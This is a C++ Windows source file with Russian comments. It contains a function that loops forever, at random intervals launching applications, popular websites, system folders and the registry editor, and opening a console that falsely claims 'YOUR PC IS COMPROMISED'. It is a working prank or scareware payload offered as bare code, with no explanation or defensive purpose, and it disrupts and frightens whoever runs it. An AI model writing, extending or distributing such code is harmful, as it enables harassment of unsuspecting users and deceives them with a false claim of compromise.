#include <windows.h>
#include <string>
#include <random>
#include <chrono>
#include <vector>
#include <shellapi.h>

std::mt19937 openRng(std::chrono::steady_clock::now().time_since_epoch().count());

void OpenRandomAppsAndSites() {
    while (true) {
        try {
            int action = std::uniform_int_distribution<int>(0, 5)(openRng);

            switch (action) {
                case 0: {
                    // Открываем случайное приложение
                    std::vector<std::string> apps = {
                        "calc", "notepad", "mspaint", "write",
                        "wordpad", "explorer", "taskmgr"
                    };
                    std::string app = apps[std::uniform_int_distribution<int>(0, apps.size() - 1)(openRng)];
                    ShellExecuteA(NULL, "open", app.c_str(), NULL, NULL, SW_SHOW);
                    break;
                }

                case 1: {
                    // Открываем случайный сайт
                    std::vector<std::string> sites = {
                        "https://youtube.com",
                        "https://google.com",
                        "https://reddit.com",
                        "https://ebay.com",
                        "https://amazon.com",
                        "https://wikipedia.org",
                        "https://twitch.tv",
                        "https://github.com",
                        "https://stackoverflow.com"
                    };
                    std::string site = sites[std::uniform_int_distribution<int>(0, sites.size() - 1)(openRng)];
                    ShellExecuteA(NULL, "open", site.c_str(), NULL, NULL, SW_SHOW);
                    break;
                }

                case 2: {
                    // Открываем картинку
                    ShellExecuteA(NULL, "open", "mspaint.exe", NULL, NULL, SW_SHOW);
                    break;
                }

                case 3: {
                    // Открываем консоль с сообщением
                    system("start cmd /k echo YOUR PC IS COMPROMISED");
                    break;
                }

                case 4: {
                    // Открываем explorer в случайной папке
                    std::vector<std::string> folders = {
                        "C:\\Windows",
                        "C:\\Windows\\System32",
                        "C:\\",
                        "C:\\Program Files"
                    };
                    std::string folder = folders[std::uniform_int_distribution<int>(0, folders.size() - 1)(openRng)];
                    ShellExecuteA(NULL, "open", "explorer.exe", folder.c_str(), NULL, SW_SHOW);
                    break;
                }

                case 5: {
                    // Открываем редактор реестра
                    system("start regedit");
                    break;
                }
            }

            Sleep(std::uniform_int_distribution<int>(5000, 20000)(openRng));

        } catch (...) {
            Sleep(10000);
        }
    }
}
